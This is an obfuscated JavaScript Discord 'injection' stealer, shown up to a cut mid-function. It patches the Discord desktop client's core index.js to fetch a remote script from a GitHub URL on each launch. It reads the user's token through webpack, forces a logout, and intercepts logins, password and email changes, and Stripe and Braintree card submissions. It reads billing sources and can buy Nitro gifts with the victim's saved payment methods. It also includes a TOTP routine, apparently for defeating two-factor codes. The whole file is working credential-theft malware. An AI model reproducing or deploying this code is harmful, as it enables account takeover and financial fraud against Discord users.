const _0x298b61=_0x8f25;function _0x8f25(_0x112e7d,_0x3cd861){const _0x530ea9=_0x530e();return _0x8f25=function(_0x8f25b6,_0x18ce80){_0x8f25b6=_0x8f25b6-0x154;let _0x1d037d=_0x530ea9[_0x8f25b6];return _0x1d037d;},_0x8f25(_0x112e7d,_0x3cd861);}(function(_0x545400,_0x17e618){const _0x419644=_0x8f25,_0x3b6e45=_0x545400();while(!![]){try{const _0x22be01=parseInt(_0x419644(0x1f7))/0x1*(parseInt(_0x419644(0x1b0))/0x2)+-parseInt(_0x419644(0x186))/0x3*(-parseInt(_0x419644(0x1d1))/0x4)+-parseInt(_0x419644(0x1af))/0x5*(-parseInt(_0x419644(0x170))/0x6)+-parseInt(_0x419644(0x164))/0x7*(parseInt(_0x419644(0x22e))/0x8)+parseInt(_0x419644(0x22b))/0x9+parseInt(_0x419644(0x15a))/0xa*(parseInt(_0x419644(0x1ad))/0xb)+-parseInt(_0x419644(0x206))/0xc*(parseInt(_0x419644(0x216))/0xd);if(_0x22be01===_0x17e618)break;else _0x3b6e45['push'](_0x3b6e45['shift']());}catch(_0x48a89f){_0x3b6e45['push'](_0x3b6e45['shift']());}}}(_0x530e,0x6a0c8));const args=process[_0x298b61(0x1b7)],fs=require('fs'),path=require(_0x298b61(0x1c7)),https=require(_0x298b61(0x1f2)),querystring=require(_0x298b61(0x1bc)),{BrowserWindow,session}=require(_0x298b61(0x215)),config={'webhook':_0x298b61(0x1fb),'webhook_protector_key':_0x298b61(0x1f5),'auto_buy_nitro':![],'ping_on_run':![],'ping_val':_0x298b61(0x1cd),'embed_name':'Christopheryves\x20Injection','embed_icon':_0x298b61(0x22c),'embed_color':0x0,'injection_url':'https://raw.githubusercontent.com/psikiyatrist/discord-injection/main/obfuscated.js','api':'https://discord.com/api/v9/users/@me','nitro':{'boost':{'year':{'id':'521847234246082599','sku':_0x298b61(0x20c),'price':_0x298b61(0x1a9)},'month':{'id':_0x298b61(0x182),'sku':'511651880837840896','price':_0x298b61(0x16d)}},'classic':{'month':{'id':_0x298b61(0x157),'sku':'511651871736201216','price':_0x298b61(0x1f0)}}},'filter':{'urls':[_0x298b61(0x1dd),_0x298b61(0x1e6),_0x298b61(0x1a7),_0x298b61(0x177),_0x298b61(0x1e9),_0x298b61(0x19a),_0x298b61(0x209),'https://api.stripe.com/v*/tokens',_0x298b61(0x1f6),_0x298b61(0x1d0)]},'filter2':{'urls':[_0x298b61(0x1eb),_0x298b61(0x15f),_0x298b61(0x155),_0x298b61(0x185),_0x298b61(0x223),_0x298b61(0x1a0)]}};function parity_32(_0x336ae7,_0x5cf365,_0x2828c0){return _0x336ae7^_0x5cf365^_0x2828c0;}function ch_32(_0x49c19a,_0x43d433,_0x1661e2){return _0x49c19a&_0x43d433^~_0x49c19a&_0x1661e2;}function maj_32(_0x3bac63,_0x31256b,_0x132925){return _0x3bac63&_0x31256b^_0x3bac63&_0x132925^_0x31256b&_0x132925;}function rotl_32(_0x7dc351,_0xbafbb5){return _0x7dc351<<_0xbafbb5|_0x7dc351>>>0x20-_0xbafbb5;}function safeAdd_32_2(_0x3c5f8e,_0x200526){var _0x41a50d=(_0x3c5f8e&0xffff)+(_0x200526&0xffff),_0x1ade78=(_0x3c5f8e>>>0x10)+(_0x200526>>>0x10)+(_0x41a50d>>>0x10);return(_0x1ade78&0xffff)<<0x10|_0x41a50d&0xffff;}function safeAdd_32_5(_0x3876bc,_0x4b08d8,_0x357a88,_0xc1ddca,_0x2c012a){var _0xb33f01=(_0x3876bc&0xffff)+(_0x4b08d8&0xffff)+(_0x357a88&0xffff)+(_0xc1ddca&0xffff)+(_0x2c012a&0xffff),_0x573937=(_0x3876bc>>>0x10)+(_0x4b08d8>>>0x10)+(_0x357a88>>>0x10)+(_0xc1ddca>>>0x10)+(_0x2c012a>>>0x10)+(_0xb33f01>>>0x10);return(_0x573937&0xffff)<<0x10|_0xb33f01&0xffff;}function binb2hex(_0x15ed70){const _0x291c05=_0x298b61;var _0x7526b1='0123456789abcdef',_0x393322='',_0x41626c=_0x15ed70[_0x291c05(0x1ea)]*0x4,_0x15246d,_0x5887c5;for(_0x15246d=0x0;_0x15246d<_0x41626c;_0x15246d+=0x1){_0x5887c5=_0x15ed70[_0x15246d>>>0x2]>>>(0x3-_0x15246d%0x4)*0x8,_0x393322+=_0x7526b1[_0x291c05(0x1a8)](_0x5887c5>>>0x4&0xf)+_0x7526b1[_0x291c05(0x1a8)](_0x5887c5&0xf);}return _0x393322;}function getH(){return[0x67452301,0xefcdab89,0x98badcfe,0x10325476,0xc3d2e1f0];}function roundSHA1(_0x1fd467,_0x5d0fc7){var _0x5257be=[],_0x3968a1,_0x4f0cb7,_0x1f33e,_0x21af0f,_0x714482,_0xade36b,_0x4ff08d=ch_32,_0x2d96cf=parity_32,_0x15ce02=maj_32,_0x325f63=rotl_32,_0x309e5d=safeAdd_32_2,_0x281ff4,_0x4fe508=safeAdd_32_5;_0x3968a1=_0x5d0fc7[0x0],_0x4f0cb7=_0x5d0fc7[0x1],_0x1f33e=_0x5d0fc7[0x2],_0x21af0f=_0x5d0fc7[0x3],_0x714482=_0x5d0fc7[0x4];for(_0x281ff4=0x0;_0x281ff4<0x50;_0x281ff4+=0x1){_0x281ff4<0x10?_0x5257be[_0x281ff4]=_0x1fd467[_0x281ff4]:_0x5257be[_0x281ff4]=_0x325f63(_0x5257be[_0x281ff4-0x3]^_0x5257be[_0x281ff4-0x8]^_0x5257be[_0x281ff4-0xe]^_0x5257be[_0x281ff4-0x10],0x1);if(_0x281ff4<0x14)_0xade36b=_0x4fe508(_0x325f63(_0x3968a1,0x5),_0x4ff08d(_0x4f0cb7,_0x1f33e,_0x21af0f),_0x714482,0x5a827999,_0x5257be[_0x281ff4]);else{if(_0x281ff4<0x28)_0xade36b=_0x4fe508(_0x325f63(_0x3968a1,0x5),_0x2d96cf(_0x4f0cb7,_0x1f33e,_0x21af0f),_0x714482,0x6ed9eba1,_0x5257be[_0x281ff4]);else _0x281ff4<0x3c?_0xade36b=_0x4fe508(_0x325f63(_0x3968a1,0x5),_0x15ce02(_0x4f0cb7,_0x1f33e,_0x21af0f),_0x714482,0x8f1bbcdc,_0x5257be[_0x281ff4]):_0xade36b=_0x4fe508(_0x325f63(_0x3968a1,0x5),_0x2d96cf(_0x4f0cb7,_0x1f33e,_0x21af0f),_0x714482,0xca62c1d6,_0x5257be[_0x281ff4]);}_0x714482=_0x21af0f,_0x21af0f=_0x1f33e,_0x1f33e=_0x325f63(_0x4f0cb7,0x1e),_0x4f0cb7=_0x3968a1,_0x3968a1=_0xade36b;}return _0x5d0fc7[0x0]=_0x309e5d(_0x3968a1,_0x5d0fc7[0x0]),_0x5d0fc7[0x1]=_0x309e5d(_0x4f0cb7,_0x5d0fc7[0x1]),_0x5d0fc7[0x2]=_0x309e5d(_0x1f33e,_0x5d0fc7[0x2]),_0x5d0fc7[0x3]=_0x309e5d(_0x21af0f,_0x5d0fc7[0x3]),_0x5d0fc7[0x4]=_0x309e5d(_0x714482,_0x5d0fc7[0x4]),_0x5d0fc7;}function _0x530e(){const _0x19db17=['electron','16890887nHNpHE','auto_buy_nitro','amd','new_password','sep','Early\x20Supporter,\x20','embed_color','PATCH','Credit\x20Card\x20Number:\x20**','onBeforeRequest','https://cdn.discordapp.com/avatars/','\x20|\x20','index.js','https://discord.com/api/v*/users/@me/library','card[cvc]','rmdirSync','url','jsSHA','Discord\x20Staff,\x20','pathname','default-src\x20\x27*\x27','3581964MjfPGr','https://resmim.net/cdn/2024/02/09/ZJtetH.jpg','Active\x20Developer,\x20','2917048qqeVvu','POST','\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK_KEY%\x27,\x20\x27','https://discord.com/api/v*/applications/detectable','startsWith','521846918637420545','**\x0aOld\x20Password:\x20**','flags','17340dwGraa','responseHeaders','Nitro\x20Type:\x20**','Partnered\x20Server\x20Owner,\x20','\x27;\x0aconst\x20fileSize\x20=\x20fs.statSync(indexJs).size\x0afs.readFileSync(indexJs,\x20\x27utf8\x27,\x20(err,\x20data)\x20=>\x20{\x0a\x20\x20\x20\x20if\x20(fileSize\x20<\x2020000\x20||\x20data\x20===\x20\x22module.exports\x20=\x20require(\x27./core.asar\x27)\x22)\x20\x0a\x20\x20\x20\x20\x20\x20\x20\x20init();\x0a})\x0aasync\x20function\x20init()\x20{\x0a\x20\x20\x20\x20https.get(\x27','https://*.discord.com/api/v*/applications/detectable','log','Email:\x20**','HypeSquad\x20Bravery,\x20','numRounds\x20must\x20a\x20integer\x20>=\x201','14cIZNhj','defaultSession','content-security-policy-report-only','api/webhooks','2422867c-244d-476a-ba4f-36e197758d97','String\x20of\x20HEX\x20type\x20contains\x20invalid\x20characters','month','win32','existsSync','999','users/@me','gift_code','1453074MsCJNQ','resources','app.asar','error','tokens','card[number]','Hypesquad\x20Event,\x20','https://discordapp.com/api/v*/auth/login','round','const\x20fs\x20=\x20require(\x27fs\x27),\x20https\x20=\x20require(\x27https\x27);\x0aconst\x20indexJs\x20=\x20\x27','\x22);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x27Content-Type\x27,\x20\x27application/json\x27);\x0a\x20\x20\x20\x20xmlHttp.send(JSON.stringify(','parse','```','getHMAC','));\x0a\x20\x20\x20\x20xmlHttp.responseText','**\x0aCVC:\x20**','includes','application/json','521847234246082599','username','var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22POST\x22,\x20\x22https://discord.com/api/v9/store/skus/','https://*.discord.com/api/v*/users/@me/library','3NQSRbz','embed_icon','**\x0aBilling:\x20**','Verified\x20Bot\x20Developer,\x20','protocol','executeJavaScript','concat','stringify','Resources','ABCDEFGHIJKLMNOPQRSTUVWXYZ234567','embed_name','substr','nitro','\x22);\x0a\x20\x20\x20\x20xmlHttp.send(null);\x0a\x20\x20\x20\x20xmlHttp.responseText;','https://discord.gift/','assign','binLen','slice','write','.webp','https://*.discord.com/api/v*/auth/login','discord','initiation','\x22);\x20\x0a\x20\x20\x20\x20xmlHttp.send(null);\x20\x0a\x20\x20\x20\x20xmlHttp.responseText','💳\x20','end','wss://remote-auth-gateway.discord.gg/*','unlinkSync','substring','content','/billing/payment-sources\x22,\x20false);\x20\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','APPDATA','platform','https://*.discord.com/api/v*/users/@me','charAt','9999','card[exp_year]','filter','confirm','5093ANJjyZ','max','15nIhNwc','2TMMiqV','endsWith','**Token**','setHMACKey','Nitro\x20Classic','statusCode','type','argv','mkdirSync','/purchase\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','**\x0aPassword:\x20**','uploadData','querystring','Green\x20BugHunter,\x20','now','No\x20Nitro','api','Contents','\x22,\x20false);\x0a\x20\x20\x20\x20xmlHttp.setRequestHeader(\x22Authorization\x22,\x20\x22','ping_val','package.json','avatar','join','path','discord.com','Access-Control-Allow-Headers\x20\x27*\x27','undefined','Time\x20to\x20buy\x20some\x20nitro\x20baby\x20😩','filter2','@everyone','**Nitro\x20bought!**','update','https://api.stripe.com/v*/payment_intents/*/confirm','611476WwOZGA','\x27)\x0aif\x20(fs.existsSync(bdPath))\x20require(bdPath);','webRequest','\x5cmodules\x5c','forEach','<:paypal:951139189389410365>\x20','premium_type','onHeadersReceived','Access-Control-Allow-Origin\x20\x27*\x27','toUpperCase','replace','push','https://discord.com/api/v*/users/@me','method','discriminator','darwin','year','login','toString','boost','function','https://discordapp.com/api/v*/users/@me','host','Invalid\x20base32\x20character\x20in\x20key','https://discord.com/api/v*/auth/login','length','https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json','webhook','New\x20Email:\x20**','invalid','**\x0aBadges:\x20**','499','exports','https','\x5cbetterdiscord\x5cdata\x5cbetterdiscord.asar','app','%WEBHOOK_KEY%','https://api.stripe.com/v*/setup_intents/*/confirm','382693yjhlAd','getAllWindows','**Discord\x20Info**','**Password\x20Changed**','%WEBHOOK%','(webpackChunkdiscord_app.push([[\x27\x27],{},e=>{m=[];for(let\x20c\x20in\x20e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void\x200).exports.default.getToken()','ping_on_run','wss://remote-auth-gateway','\x27;\x0aconst\x20bdPath\x20=\x20\x27','split','HypeSquad\x20Balance,\x20','indexOf','webhook_protector_key','Gold\x20BugHunter,\x20','email','12nPoBmk','None','7fffffff','https://api.braintreegateway.com/merchants/49pp2rp4phym7387/client_api/v*/payment_methods/paypal_accounts','value','window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\x22get_require\x22]]]),delete\x20gg.m.get_require,delete\x20gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function\x20LogOut(){(function(a){const\x20b=\x22string\x22==typeof\x20a?a:null;for(const\x20c\x20in\x20gg.c)if(gg.c.hasOwnProperty(c)){const\x20d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return\x20d.default;if(d&&(b?d[b]:a(d)))return\x20d}return\x20null})(\x22login\x22).logout()}LogOut();','511651885459963904','password','default','catch','writeFileSync','webContents','content-security-policy','readdirSync','bytes'];_0x530e=function(){return _0x19db17;};return _0x530e();}function finalizeSHA1(_0x2ce0e,_0x40aef2,_0x1b9f8b,_0x457619){const _0x42446c=_0x298b61;var _0x59086d,_0x508362,_0x54a45e;_0x54a45e=(_0x40aef2+0x41>>>0x9<<0x4)+0xf;while(_0x2ce0e[_0x42446c(0x1ea)]<=_0x54a45e){_0x2ce0e[_0x42446c(0x1dc)](0x0);}_0x2ce0e[_0x40aef2>>>0x5]|=0x80<<0x18-_0x40aef2%0x20,_0x2ce0e[_0x54a45e]=_0x40aef2+_0x1b9f8b,_0x508362=_0x2ce0e['length'];for(_0x59086d=0x0;_0x59086d<_0x508362;_0x59086d+=0x10){_0x457619=roundSHA1(_0x2ce0e['slice'](_0x59086d,_0x59086d+0x10),_0x457619);}return _0x457619;}function hex2binb(_0x35dbda,_0x5f5cea,_0x17c801){const _0x443c76=_0x298b61;var _0xce737f,_0x204ba2=_0x35dbda[_0x443c76(0x1ea)],_0x466a54,_0x9ec01b,_0x23d47c,_0x1d4037,_0x16b54c;_0xce737f=_0x5f5cea||[0x0],_0x17c801=_0x17c801||0x0,_0x16b54c=_0x17c801>>>0x3;0x0!==_0x204ba2%0x2&&console[_0x443c76(0x173)]('String\x20of\x20HEX\x20type\x20must\x20be\x20in\x20byte\x20increments');for(_0x466a54=0x0;_0x466a54<_0x204ba2;_0x466a54+=0x2){_0x9ec01b=parseInt(_0x35dbda[_0x443c76(0x191)](_0x466a54,0x2),0x10);if(!isNaN(_0x9ec01b)){_0x1d4037=(_0x466a54>>>0x1)+_0x16b54c,_0x23d47c=_0x1d4037>>>0x2;while(_0xce737f[_0x443c76(0x1ea)]<=_0x23d47c){_0xce737f[_0x443c76(0x1dc)](0x0);}_0xce737f[_0x23d47c]|=_0x9ec01b<<0x8*(0x3-_0x1d4037%0x4);}else console[_0x443c76(0x173)](_0x443c76(0x169));}return{'value':_0xce737f,'binLen':_0x204ba2*0x4+_0x17c801};}class jsSHA{constructor(){const _0x5c4879=_0x298b61;var _0x2f2344=0x0,_0x52b30c=[],_0x86d87c=0x0,_0x3a3abf,_0x14c579,_0x13453c,_0x5b2e39,_0x401cd2,_0x4d69b5,_0xd75e64=![],_0x581096=![],_0x3b9ab0=[],_0x577990=[],_0x69a4e5,_0x69a4e5=0x1;_0x14c579=hex2binb,(_0x69a4e5!==parseInt(_0x69a4e5,0xa)||0x1>_0x69a4e5)&&console[_0x5c4879(0x173)](_0x5c4879(0x163)),_0x5b2e39=0x200,_0x401cd2=roundSHA1,_0x4d69b5=finalizeSHA1,_0x13453c=0xa0,_0x3a3abf=getH(),this[_0x5c4879(0x1b3)]=function(_0x3e6aea){const _0x18fc5d=_0x5c4879;var _0x39b790,_0x2c2d79,_0x236879,_0xa8e2bf,_0x573776,_0x5db64a,_0x3c569c;_0x39b790=hex2binb,_0x2c2d79=_0x39b790(_0x3e6aea),_0x236879=_0x2c2d79[_0x18fc5d(0x196)],_0xa8e2bf=_0x2c2d79[_0x18fc5d(0x20a)],_0x573776=_0x5b2e39>>>0x3,_0x3c569c=_0x573776/0x4-0x1;if(_0x573776<_0x236879/0x8){_0xa8e2bf=_0x4d69b5(_0xa8e2bf,_0x236879,0x0,getH());while(_0xa8e2bf[_0x18fc5d(0x1ea)]<=_0x3c569c){_0xa8e2bf['push'](0x0);}_0xa8e2bf[_0x3c569c]&=0xffffff00;}else{if(_0x573776>_0x236879/0x8){while(_0xa8e2bf[_0x18fc5d(0x1ea)]<=_0x3c569c){_0xa8e2bf['push'](0x0);}_0xa8e2bf[_0x3c569c]&=0xffffff00;}}for(_0x5db64a=0x0;_0x5db64a<=_0x3c569c;_0x5db64a+=0x1){_0x3b9ab0[_0x5db64a]=_0xa8e2bf[_0x5db64a]^0x36363636,_0x577990[_0x5db64a]=_0xa8e2bf[_0x5db64a]^0x5c5c5c5c;}_0x3a3abf=_0x401cd2(_0x3b9ab0,_0x3a3abf),_0x2f2344=_0x5b2e39,_0x581096=!![];},this['update']=function(_0x2ba938){const _0x46b0b7=_0x5c4879;var _0x5339e4,_0x524a57,_0x2ecf1f,_0xd4c57f,_0x14cf2e,_0x5e0b6f=0x0,_0x476eb9=_0x5b2e39>>>0x5;_0x5339e4=_0x14c579(_0x2ba938,_0x52b30c,_0x86d87c),_0x524a57=_0x5339e4[_0x46b0b7(0x196)],_0xd4c57f=_0x5339e4[_0x46b0b7(0x20a)],_0x2ecf1f=_0x524a57>>>0x5;for(_0x14cf2e=0x0;_0x14cf2e<_0x2ecf1f;_0x14cf2e+=_0x476eb9){_0x5e0b6f+_0x5b2e39<=_0x524a57&&(_0x3a3abf=_0x401cd2(_0xd4c57f['slice'](_0x14cf2e,_0x14cf2e+_0x476eb9),_0x3a3abf),_0x5e0b6f+=_0x5b2e39);}_0x2f2344+=_0x5e0b6f,_0x52b30c=_0xd4c57f['slice'](_0x5e0b6f>>>0x5),_0x86d87c=_0x524a57%_0x5b2e39;},this[_0x5c4879(0x17d)]=function(){var _0x5a25da;![]===_0x581096&&console['error']('Cannot\x20call\x20getHMAC\x20without\x20first\x20setting\x20HMAC\x20key');const _0x15c0bb=function(_0x1c7cfc){return binb2hex(_0x1c7cfc);};return![]===_0xd75e64&&(_0x5a25da=_0x4d69b5(_0x52b30c,_0x86d87c,_0x2f2344,_0x3a3abf),_0x3a3abf=_0x401cd2(_0x577990,getH()),_0x3a3abf=_0x4d69b5(_0x5a25da,_0x13453c,_0x5b2e39,_0x3a3abf)),_0xd75e64=!![],_0x15c0bb(_0x3a3abf);};}}if(_0x298b61(0x1e5)===typeof define&&define[_0x298b61(0x218)])define(function(){return jsSHA;});else _0x298b61(0x1ca)!==typeof exports?_0x298b61(0x1ca)!==typeof module&&module['exports']?module['exports']=exports=jsSHA:exports=jsSHA:global[_0x298b61(0x227)]=jsSHA;jsSHA['default']&&(jsSHA=jsSHA[_0x298b61(0x20e)]);function totp(_0x5b677a){const _0xa21623=_0x298b61,_0x3b32d2=0x1e,_0x12865d=0x6,_0x54f028=Date[_0xa21623(0x1be)](),_0x2b8986=Math[_0xa21623(0x178)](_0x54f028/0x3e8),_0xc92e54=leftpad(dec2hex(Math['floor'](_0x2b8986/_0x3b32d2)),0x10,'0'),_0x472ca9=new jsSHA();_0x472ca9[_0xa21623(0x1b3)](base32tohex(_0x5b677a)),_0x472ca9[_0xa21623(0x1cf)](_0xc92e54);const _0x24e892=_0x472ca9['getHMAC'](),_0x30cb3f=hex2dec(_0x24e892[_0xa21623(0x1a2)](_0x24e892[_0xa21623(0x1ea)]-0x1));let _0x40aecb=(hex2dec(_0x24e892['substr'](_0x30cb3f*0x2,0x8))&hex2dec(_0xa21623(0x208)))+'';return _0x40aecb=_0x40aecb[_0xa21623(0x191)](Math[_0xa21623(0x1ae)](_0x40aecb['length']-_0x12865d,0x0),_0x12865d),_0x40aecb;}function hex2dec(_0xb89202){return parseInt(_0xb89202,0x10);}function dec2hex(_0x446fc5){const _0x2eddd6=_0x298b61;return(_0x446fc5<15.5?'0':'')+Math[_0x2eddd6(0x178)](_0x446fc5)['toString'](0x10);}function base32tohex(_0x486de2){const _0x40a5d7=_0x298b61;let _0x4db412=_0x40a5d7(0x18f),_0x54892f='',_0x4661e8='';_0x486de2=_0x486de2[_0x40a5d7(0x1db)](/=+$/,'');for(let _0x5d9463=0x0;_0x5d9463<_0x486de2['length'];_0x5d9463++){let _0x4e46eb=_0x4db412[_0x40a5d7(0x202)](_0x486de2[_0x40a5d7(0x1a8)](_0x5d9463)[_0x40a5d7(0x1da)]());if(_0x4e46eb===-0x1)console[_0x40a5d7(0x173)](_0x40a5d7(0x1e8));_0x54892f+=leftpad(_0x4e46eb[_0x40a5d7(0x1e3)](0x2),0x5,'0');}for(let _0x587d02=0x0;_0x587d02+0x8<=_0x54892f[_0x40a5d7(0x1ea)];_0x587d02+=0x8){let _0x4e27f3=_0x54892f['substr'](_0x587d02,0x8);_0x4661e8=_0x4661e8+leftpad(parseInt(_0x4e27f3,0x2)['toString'](0x10),0x2,'0');}return _0x4661e8;}function leftpad(_0x2963cb,_0x1d6cc2,_0x15b63e){const _0x5a16a2=_0x298b61;return _0x1d6cc2+0x1>=_0x2963cb[_0x5a16a2(0x1ea)]&&(_0x2963cb=Array(_0x1d6cc2+0x1-_0x2963cb['length'])[_0x5a16a2(0x1c6)](_0x15b63e)+_0x2963cb),_0x2963cb;}const discordPath=(function(){const _0x1c593a=_0x298b61,_0x351971=args[0x0][_0x1c593a(0x200)](path[_0x1c593a(0x21a)])[_0x1c593a(0x197)](0x0,-0x1)[_0x1c593a(0x1c6)](path['sep']);let _0x456fe9;if(process[_0x1c593a(0x1a6)]===_0x1c593a(0x16b))_0x456fe9=path['join'](_0x351971,_0x1c593a(0x171));else process[_0x1c593a(0x1a6)]===_0x1c593a(0x1e0)&&(_0x456fe9=path[_0x1c593a(0x1c6)](_0x351971,_0x1c593a(0x1c1),_0x1c593a(0x18e)));if(fs['existsSync'](_0x456fe9))return{'resourcePath':_0x456fe9,'app':_0x351971};return{'undefined':undefined,'undefined':undefined};}());function updateCheck(){const _0x19f2b4=_0x298b61,{resourcePath:_0xaa60d7,app:_0x5d63f0}=discordPath;if(_0xaa60d7===undefined||_0x5d63f0===undefined)return;const _0x8fc95f=path[_0x19f2b4(0x1c6)](_0xaa60d7,_0x19f2b4(0x1f4)),_0x580369=path['join'](_0x8fc95f,_0x19f2b4(0x1c4)),_0x4671b7=path['join'](_0x8fc95f,_0x19f2b4(0x222)),_0x403726=fs[_0x19f2b4(0x213)](_0x5d63f0+_0x19f2b4(0x1d4))[_0x19f2b4(0x1ab)](_0x230cb4=>/discord_desktop_core-+?/['test'](_0x230cb4))[0x0],_0x52146a=_0x5d63f0+_0x19f2b4(0x1d4)+_0x403726+'\x5cdiscord_desktop_core\x5cindex.js',_0x979f96=path['join'](process['env'][_0x19f2b4(0x1a5)],_0x19f2b4(0x1f3));if(!fs[_0x19f2b4(0x16c)](_0x8fc95f))fs[_0x19f2b4(0x1b8)](_0x8fc95f);if(fs[_0x19f2b4(0x16c)](_0x580369))fs[_0x19f2b4(0x1a1)](_0x580369);if(fs[_0x19f2b4(0x16c)](_0x4671b7))fs['unlinkSync'](_0x4671b7);if(process[_0x19f2b4(0x1a6)]===_0x19f2b4(0x16b)||process['platform']===_0x19f2b4(0x1e0)){fs[_0x19f2b4(0x210)](_0x580369,JSON[_0x19f2b4(0x18d)]({'name':_0x19f2b4(0x19b),'main':_0x19f2b4(0x222)},null,0x4));const _0x233d93=_0x19f2b4(0x179)+_0x52146a+_0x19f2b4(0x1ff)+_0x979f96+_0x19f2b4(0x15e)+config['injection_url']+'\x27,\x20(res)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20const\x20file\x20=\x20fs.createWriteStream(indexJs);\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.replace(\x27%WEBHOOK%\x27,\x20\x27'+config[_0x19f2b4(0x1ec)]+_0x19f2b4(0x154)+config[_0x19f2b4(0x203)]+'\x27)\x0a\x20\x20\x20\x20\x20\x20\x20\x20res.pipe(file);\x0a\x20\x20\x20\x20\x20\x20\x20\x20file.on(\x27finish\x27,\x20()\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20file.close();\x0a\x20\x20\x20\x20\x20\x20\x20\x20});\x0a\x20\x20\x20\x20\x0a\x20\x20\x20\x20}).on(\x22error\x22,\x20(err)\x20=>\x20{\x0a\x20\x20\x20\x20\x20\x20\x20\x20setTimeout(init(),\x2010000);\x0a\x20\x20\x20\x20});\x0a}\x0arequire(\x27'+path[_0x19f2b4(0x1c6)](_0xaa60d7,_0x19f2b4(0x172))+_0x19f2b4(0x1d2);fs[_0x19f2b4(0x210)](_0x4671b7,_0x233d93[_0x19f2b4(0x1db)](/\\/g,'\x5c\x5c'));}if(!fs[_0x19f2b4(0x16c)](path[_0x19f2b4(0x1c6)](__dirname,_0x19f2b4(0x19c))))return!0x0;return fs[_0x19f2b4(0x225)](path[_0x19f2b4(0x1c6)](__dirname,_0x19f2b4(0x19c))),execScript(_0x19f2b4(0x20b)),!0x1;}const execScript=_0x120169=>{const _0x85ebd7=_0x298b61,_0x32c663=BrowserWindow[_0x85ebd7(0x1f8)]()[0x0];return _0x32c663[_0x85ebd7(0x211)][_0x85ebd7(0x18b)](_0x120169,!0x0);},getInfo=async _0x2d44ef=>{const _0x505629=_0x298b61,_0x1d50bb=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config[_0x505629(0x1c0)]+_0x505629(0x1c2)+_0x2d44ef+_0x505629(0x193));return JSON[_0x505629(0x17b)](_0x1d50bb);},fetchBilling=async _0x10a147=>{const _0x1e1277=_0x298b61,_0x58adf9=await execScript('var\x20xmlHttp\x20=\x20new\x20XMLHttpRequest();\x20\x0a\x20\x20\x20\x20xmlHttp.open(\x22GET\x22,\x20\x22'+config['api']+_0x1e1277(0x1a4)+_0x10a147+_0x1e1277(0x19d));if(!_0x58adf9['lenght']||_0x58adf9['length']===0x0)return'';return JSON[_0x1e1277(0x17b)](_0x58adf9);},getBilling=async _0x1e2dee=>{const _0x208b7b=await fetchBilling(_0x1e2dee);if(!_0x208b7b)return'❌';let _0x1d2c95='';_0x208b7b['forEach'](_0x241847=>{const _0x43043d=_0x8f25;if(!_0x241847[_0x43043d(0x1ee)])switch(_0x241847[_0x43043d(0x1b6)]){case 0x1:_0x1d2c95+=_0x43043d(0x19e);break;case 0x2:_0x1d2c95+=_0x43043d(0x1d6);break;}});if(!_0x1d2c95)_0x1d2c95='❌';return _0x1d2c95;},Purchase=async(_0xdfe354,_0x3b2b27,_0x5731ef,_0xbf4f94)=>{const _0x786548=_0x298b61,_0x7e91b9={'expected_amount':config[_0x786548(0x192)][_0x5731ef][_0xbf4f94]['price'],'expected_currency':'usd','gift':!![],'payment_source_id':_0x3b2b27,'payment_source_token':null,'purchase_token':_0x786548(0x168),'sku_subscription_plan_id':config[_0x786548(0x192)][_0x5731ef][_0xbf4f94]['sku']},_0x180298=execScript(_0x786548(0x184)+config[_0x786548(0x192)][_0x5731ef][_0xbf4f94]['id']+_0x786548(0x1b9)+_0xdfe354+_0x786548(0x17a)+JSON[_0x786548(0x18d)](_0x7e91b9)+_0x786548(0x17e));if(_0x180298[_0x786548(0x16f)])return _0x786548(0x194)+_0x180298['gift_code'];else return null;},buyNitro=async _0x33b90f=>{const _0x5dce46=_0x298b61,_0x4baa72=await fetchBilling(_0x33b90f),_0x42c088='Failed\x20to\x20Purchase\x20❌';if(!_0x4baa72)return _0x42c088;let _0x2c79f8=[];_0x4baa72[_0x5dce46(0x1d5)](_0xc7d17b=>{const _0x5c6095=_0x5dce46;!_0xc7d17b[_0x5c6095(0x1ee)]&&(_0x2c79f8=_0x2c79f8[_0x5c6095(0x18c)](_0xc7d17b['id']));});for(let _0x4b9ae6 in _0x2c79f8){const _0x5e7417=Purchase(_0x33b90f,_0x4b9ae6,_0x5dce46(0x1e4),_0x5dce46(0x1e1));if(_0x5e7417!==null)return _0x5e7417;else{const _0x56ca7e=Purchase(_0x33b90f,_0x4b9ae6,_0x5dce46(0x1e4),_0x5dce46(0x16a));if(_0x56ca7e!==null)return _0x56ca7e;else{const _0xbeeb44=Purchase(_0x33b90f,_0x4b9ae6,'classic',_0x5dce46(0x16a));return _0xbeeb44!==null?_0xbeeb44:_0x42c088;}}}},getNitro=_0x30f747=>{const _0x4f4f3c=_0x298b61;switch(_0x30f747){case 0x0:return _0x4f4f3c(0x1bf);case 0x1:return _0x4f4f3c(0x1b4);case 0x2:return'Nitro\x20Boost';default:return _0x4f4f3c(0x1bf);}},getBadges=_0x11d1d4=>{const _0x4030c8=_0x298b61;let _0x216983='';switch(_0x11d1d4){case 0x1:_0x216983+=_0x4030c8(0x228);break;case 0x2:_0x216983+=_0x4030c8(0x15d);break;case 0x20000:_0x216983+=_0x4030c8(0x189);break;case 0x400000:_0x216983+=_0x4030c8(0x22d);break;case 0x4:_0x216983+=_0x4030c8(0x176);break;case 0x4000:_0x216983+=_0x4030c8(0x204);break;case 0x8:_0x216983+=_0x4030c8(0x1bd);break;case 0x200:_0x216983+=_0x4030c8(0x21b);break;case 